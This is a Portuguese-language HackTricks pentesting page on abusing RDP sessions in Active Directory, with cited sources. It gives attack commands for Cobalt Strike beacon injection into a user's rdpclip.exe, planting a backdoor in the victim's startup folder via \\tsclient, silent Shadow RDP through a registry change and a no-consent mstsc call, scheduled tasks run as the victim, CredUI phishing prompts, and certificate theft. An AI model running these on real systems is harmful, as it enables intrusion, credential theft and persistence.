# Abuso de sessões RDP

{{#include ../../banners/hacktricks-training.md}}

## Injeção de processos RDP

Se o **grupo externo** tiver **acesso RDP** a um **computador** no domínio atual, um invasor que comprometa esse computador poderá aguardar até que um membro do grupo se conecte.

Quando o usuário se conectar por RDP, o **invasor poderá fazer pivot para a sessão desse usuário** e abusar das permissões dele no domínio externo.

```bash
# Supposing the group "External Users" has RDP access in the current domain
## Find which computers they can access
## The easiest way would be with bloodhound, but you could also run:
Get-DomainGPOUserLocalGroupMapping -Identity "External Users" -LocalGroup "Remote Desktop Users" | select -expand ComputerName
#or
Find-DomainLocalGroupMember -GroupName "Remote Desktop Users" | select -expand ComputerName

# Then, compromise the listed machines, and wait til someone from the external domain logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local
## From that beacon you can just run powerview modules interacting with the external domain as that user
```

Confira **outras formas de roubar sessões com outras ferramentas** [**nesta página.**](../../network-services-pentesting/pentesting-rdp.md#session-stealing)

## Cross-Session Authentication Relay

Uma **sessão ativa de console ou RDP** pertencente a outro usuário do domínio também é uma pista quando você tem um shell com menos privilégios no mesmo host. A ativação entre sessões via DCOM pode fazer com que um servidor COM adequado nessa sessão interativa se autentique, e ferramentas como RemotePotato0 ou KrbRelay podem capturar ou retransmitir essa autenticação. O usuário conectado não precisa ser administrador do domínio: um direito de diretório de escopo restrito, como permissão para ler uma senha gerenciada de gMSA, pode ser suficiente para um pivot adicional.<sup>[[6]](#references)[[7]](#references)[[9]](#references)</sup>

Comece pelo ID da sessão e pela identidade obtidos com `query user`, `qwinsta` ou pelo inventário de sessões existente do winPEAS. Considere-os **candidatos**, não provas de que há um caminho de relay. A classe COM, seus níveis de impersonation e autenticação, a acessibilidade da sessão, o roteamento de firewall/OXID, as proteções do protocolo de destino e os direitos efetivos do principal conectado são fatores importantes. O KrbRelay documenta exemplos de LDAP, HTTP, SMB e NTLM entre sessões, mas esses caminhos dependem da versão e da configuração. O channel binding do LDAP é outra barreira contra relay no lado do destino. Em particular, o projeto RemotePotato0 informa que o cenário original de exploração RPC-to-LDAP foi corrigido em 2022; não presuma que o relay LDAP terá sucesso apenas porque há uma sessão visível.<sup>[[6]](#references)[[7]](#references)[[8]](#references)[[10]](#references)</sup>

## RDPInception

Se um usuário acessar **uma máquina via RDP** onde um **atacante** está **à espera**, o atacante poderá **injetar um beacon na sessão RDP do usuário** e, se a **vítima montou sua unidade** ao acessar via RDP, o **atacante poderá acessá-la**.

Nesse caso, você poderia simplesmente **comprometer** o **computador original da vítima** gravando um **backdoor** na **pasta de inicialização**.

```bash
# Wait til someone logs in:
net logons
Logged on users at \\localhost:
EXT\super.admin

# With cobalt strike you could just inject a beacon inside of the RDP process
beacon> ps
 PID   PPID  Name                         Arch  Session     User
 ---   ----  ----                         ----  -------     -----
 ...
 4960  1012  rdpclip.exe                  x64   3           EXT\super.admin

beacon> inject 4960 x64 tcp-local

# There's a UNC path called tsclient which has a mount point for every drive that is being shared over RDP.
## \\tsclient\c is the C: drive on the origin machine of the RDP session
beacon> ls \\tsclient\c

 Size     Type    Last Modified         Name
 ----     ----    -------------         ----
          dir     02/10/2021 04:11:30   $Recycle.Bin
          dir     02/10/2021 03:23:44   Boot
          dir     02/20/2021 10:15:23   Config.Msi
          dir     10/18/2016 01:59:39   Documents and Settings
          [...]

# Upload backdoor to startup folder
beacon> cd \\tsclient\c\Users\<username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\pivot.exe
```

## Shadow RDP

Se você for **local admin** em um host onde a vítima já tenha uma **sessão RDP ativa**, talvez consiga **visualizar/controlar essa área de trabalho sem roubar a senha nem fazer dump do LSASS**.<sup>[[1]](#references)</sup>

Isso depende da política de **shadowing do Remote Desktop Services**, armazenada em:<sup>[[2]](#references)</sup><sup>[[3]](#references)</sup>

```text
HKLM\Software\Policies\Microsoft\Windows NT\Terminal Services\Shadow
```

Valores interessantes:

- `0`: Desativado
- `1`: `EnableInputNotify` (controle, aprovação do usuário necessária)
- `2`: `EnableInputNoNotify` (controle, **sem aprovação do usuário**)
- `3`: `EnableNoInputNotify` (somente visualização, aprovação do usuário necessária)
- `4`: `EnableNoInputNoNotify` (somente visualização, **sem aprovação do usuário**)

```cmd
:: Check the policy
reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow

:: Enable interaction without consent
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\Terminal Services" /v Shadow /t REG_DWORD /d 2 /f

:: Enumerate sessions and shadow the target one
quser /server:<HOST>
mstsc /v:<HOST> /shadow:<SESSION_ID> /control /noconsentprompt /prompt
```

Isso é especialmente útil quando um usuário privilegiado conectado por RDP deixou uma área de trabalho desbloqueada, uma sessão do KeePass, um console MMC, uma sessão do navegador ou um shell de administrador aberto.

## Tarefas Agendadas Como Usuário Conectado

Se você é **administrador local** e o usuário-alvo está **conectado no momento**, o Agendador de Tarefas pode iniciar código **como esse usuário sem a senha dele**.<sup>[[1]](#references)</sup><sup>[[4]](#references)</sup>

Isso transforma a sessão de logon existente da vítima em um primitivo de execução:

```cmd
schtasks /create /S <HOST> /RU "<DOMAIN\\user>" /SC ONCE /ST 00:00 /TN "Updater" /TR "cmd.exe /c whoami > C:\\Windows\\Temp\\whoami.txt"
schtasks /run /S <HOST> /TN "Updater"
```

Observações:

- Se o usuário **não estiver conectado**, o Windows geralmente exige a senha para criar uma tarefa que seja executada como ele.
- Se o usuário **estiver conectado**, a tarefa pode reutilizar o contexto de logon existente.
- Essa é uma forma prática de executar ações de GUI ou iniciar binários na sessão da vítima sem tocar no LSASS.

## Abuso do prompt do CredUI na sessão da vítima

Quando você puder executar **dentro da área de trabalho interativa da vítima** (por exemplo, via **Shadow RDP** ou **uma tarefa agendada executada como esse usuário**), poderá exibir um **prompt real de credenciais do Windows** usando as APIs do CredUI e capturar as credenciais inseridas pela vítima.<sup>[[1]](#references)</sup>

APIs relevantes:

- `CredUIPromptForWindowsCredentials`
- `CredUnPackAuthenticationBuffer`

Fluxo típico:

1. Inicie um binário na sessão da vítima.
2. Exiba um prompt de autenticação de domínio que corresponda à identidade visual do domínio atual.
3. Desempacote o buffer de autenticação retornado.
4. Valide as credenciais fornecidas e, opcionalmente, continue exibindo o prompt até que credenciais válidas sejam inseridas.

Isso é útil para **phishing no host**, pois o prompt é renderizado por APIs padrão do Windows em vez de um formulário HTML falso.

## Solicitação de um PFX no contexto da vítima

A mesma primitiva de **tarefa agendada como usuário** pode ser usada para solicitar um **certificado/PFX como a vítima conectada**. Esse certificado poderá ser usado posteriormente para **autenticação no AD** como esse usuário, evitando totalmente o roubo de senhas.<sup>[[1]](#references)</sup><sup>[[5]](#references)</sup>

Fluxo geral:

1. Obtenha **admin local** em um host no qual a vítima esteja conectada.
2. Execute a lógica de inscrição/exportação como a vítima usando uma **tarefa agendada**.
3. Exporte o **PFX** resultante.
4. Use o PFX para PKINIT / autenticação no AD baseada em certificado.

Consulte as páginas sobre AD CS para ver outros abusos:

{{#ref}}
ad-certificates/account-persistence.md
{{#endref}}

## References

- [1] [SensePost - De redes planas a domínios bloqueados com modelos de tiering](https://sensepost.com/blog/2026/from-flat-networks-to-locked-up-domains-with-tiering-models/)
- [2] [Microsoft Learn – opções de sessão shadow do `mstsc`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/mstsc)
- [3] [NetExec - PR do plugin Shadow RDP #465](https://github.com/Pennyw0rth/NetExec/pull/465)
- [4] [NetExec - módulo schtask_as](https://github.com/Pennyw0rth/NetExec/blob/main/nxc/modules/schtask_as.py)
- [5] [NetExec - PR para solicitar PFX via tarefa agendada #908](https://github.com/Pennyw0rth/NetExec/pull/908)
- [6] [RemotePotato0 - ativação DCOM entre sessões e limitações atuais](https://github.com/antonioCoco/RemotePotato0)
- [7] [KrbRelay - exemplos de relay entre sessões e requisitos de CLSID](https://github.com/cube0x0/KrbRelay)
- [8] [Microsoft - comando query session](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/query-session)
- [9] [Microsoft - atributo ms-DS-GroupMSAMembership](https://learn.microsoft.com/en-us/windows/win32/adschema/a-msds-groupmsamembership)
- [10] [Microsoft - channel binding LDAP e proteção contra relay](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/ldap-channel-binding)
{{#include ../../banners/hacktricks-training.md}}
